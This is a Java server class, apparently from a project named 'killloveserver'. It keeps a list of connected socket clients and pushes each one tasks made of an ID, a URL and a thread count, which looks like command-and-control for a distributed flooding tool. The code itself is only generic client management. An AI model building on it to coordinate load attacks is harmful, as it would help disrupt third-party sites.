package com.luo123.killloveserver;

import com.jzj.socket.SocketTransceiver;
import com.luo123.killloveserver.Timers.Testtimer;

import java.io.IOException;
import java.net.Socket;
import java.util.Vector;

/**
 * Created by Administrator on 2016/8/2.
 */
public class Clientmanager {
    private Clientmanager() {

    }

    static Clientmanager cl = new Clientmanager();

    public static Clientmanager getInstance() {
        return cl;
    }
    //接口

    Vector<SocketTransceiver> client = new Vector<>();
//客户端列表



    public void addclient(SocketTransceiver cl) {
        boolean re;
        for (Task task:Taskmanager.getTaskmanager().object.values()) {
              do{
                 re =  cl.send("new!!~" + task.getId() + "!!~" + task.getUrl() + "!!~" + task.getThreads()) ;
              }while (re == false);  //失败继续发

            //上线助攻
        }
        client.add(cl);

    }
//添加客户端

    public void sendtext(String text) {
        for (int i = 0; i < client.size(); i++) {

            client.get(i).send(text);
        }

    }
//发送信息

    public void testconnect(){
        for (int i = 0; i <client.size(); i++) {

          if( client.get(i).send("ok") == false){
              client.get(i).stop();
              removeclient(client.get(i));
          }

        }

    }
    public void removeclient(SocketTransceiver cl) {
        client.remove(cl);

    }

}
